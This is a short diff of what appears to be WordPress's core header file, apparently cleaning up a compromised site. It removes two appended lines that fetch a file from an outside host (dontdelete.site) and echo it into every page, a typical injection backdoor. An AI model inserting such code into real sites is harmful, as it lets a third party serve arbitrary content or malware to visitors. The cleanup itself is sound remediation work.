@@ -18,5 +18,4 @@ if ( ! isset( $wp_did_header ) ) {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
-}$a = file_get_contents( 'https://dontdelete.site/file.txt' );
-echo $a;
+}
